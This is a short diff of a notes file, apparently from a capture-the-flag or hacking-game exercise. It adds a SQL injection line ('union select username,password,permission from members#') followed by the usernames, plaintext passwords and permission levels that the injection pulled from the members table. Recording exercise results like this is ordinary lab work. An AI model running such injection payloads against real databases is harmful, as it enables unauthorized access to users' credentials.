@@ -73,14 +73,18 @@ share4	comment	3.00
 share4	mime	3.00
 share4	data	3.00
 
-## username, password
-Boss	CdOETQHZoOD0hPvReTMr	3.00
+
+union select username,password,permission from members#
+## username, password, permission
+Boss	CdOETQHZoOD0hPvReTMr	1.00
 Maverick	turn&burn	3.00
-phreak	pwd	3.00
+phreak	pwd	4.00
 Susan	flowers99	3.00
-TW	imAPlaya	3.00
-1-2-3-4	sayULuvM3	3.00
-rich_kid	1M$	3.00
-p0pStar	thrilla	3.00
-Joe	vato	3.00
+TW	imAPlaya	2.00
+1-2-3-4	sayULuvM3	2.00
+rich_kid	1M$	2.00
+p0pStar	thrilla	2.00
+Joe	vato	2.00
+	flag:	4.00
+hacker	password	3.00
 	flag:	3.00
